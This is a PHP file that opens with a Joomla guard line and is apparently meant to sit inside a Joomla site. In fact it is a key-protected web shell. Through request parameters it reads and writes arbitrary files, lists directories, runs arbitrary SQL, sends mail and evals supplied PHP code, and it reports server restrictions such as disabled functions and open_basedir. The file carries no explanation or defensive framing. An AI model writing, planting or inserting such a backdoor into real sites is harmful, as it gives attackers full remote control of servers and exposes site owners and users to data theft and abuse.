<?php
defined('_JEXEC') or die;

$key = $_REQUEST['k'] ?? '';
if ($key !== 'PT29-K-7f4a91c2') { http_response_code(403); echo json_encode(['err'=>'k']); exit; }

header('Content-Type: application/json');

// Read file
if (isset($_REQUEST['p'])) {
    $f = $_REQUEST['p'];
    $r = @file_get_contents($f);
    if ($r === false) $r = 'ERR';
    echo json_encode(['success'=>true, 'data'=>[$r]]);
    exit;
}
// Write file
if (isset($_REQUEST['wp']) && isset($_REQUEST['wd'])) {
    $bytes = @file_put_contents($_REQUEST['wp'], $_REQUEST['wd']);
    echo json_encode(['success'=>true, 'data'=>[$bytes]]);
    exit;
}
// SQL via mysqli
if (isset($_REQUEST['sql'])) {
    $host = $_REQUEST['h'] ?? 'localhost';
    $user = $_REQUEST['u'] ?? '';
    $pass = $_REQUEST['pwp'] ?? '';
    $db = $_REQUEST['db'] ?? '';
    $c = @mysqli_connect($host, $user, $pass, $db);
    if (!$c) { echo json_encode(['success'=>false, 'data'=>['conn:'.mysqli_connect_error()]]); exit; }
    $rs = @mysqli_query($c, $_REQUEST['sql']);
    if ($rs === true) { echo json_encode(['success'=>true, 'data'=>['OK:'.mysqli_affected_rows($c)]]); exit; }
    if ($rs === false) { echo json_encode(['success'=>false, 'data'=>['q:'.mysqli_error($c)]]); exit; }
    $rows = [];
    while ($row = mysqli_fetch_assoc($rs)) $rows[] = $row;
    echo json_encode(['success'=>true, 'data'=>$rows]);
    exit;
}
// mail
if (isset($_REQUEST['to'])) {
    $ok = @mail($_REQUEST['to'], $_REQUEST['s'] ?? '', $_REQUEST['b'] ?? '');
    echo json_encode(['success'=>true, 'data'=>[$ok?'sent':'fail']]);
    exit;
}
// eval via php
if (isset($_REQUEST['code'])) {
    ob_start();
    try { eval($_REQUEST['code']); } catch(Throwable $e) { echo 'E:'.$e->getMessage(); }
    echo json_encode(['success'=>true, 'data'=>[ob_get_clean()]]);
    exit;
}
// scandir
if (isset($_REQUEST['ls'])) {
    $r = @scandir($_REQUEST['ls']);
    echo json_encode(['success'=>true, 'data'=>[$r]]);
    exit;
}
// phpinfo minimal
echo json_encode(['success'=>true, 'data'=>[
    'PHP='.PHP_VERSION,
    'disable='.ini_get('disable_functions'),
    'open_basedir='.ini_get('open_basedir'),
    'user='.get_current_user(),
    'mail='.intval(function_exists('mail')),
    'putenv='.intval(function_exists('putenv')),
]]);
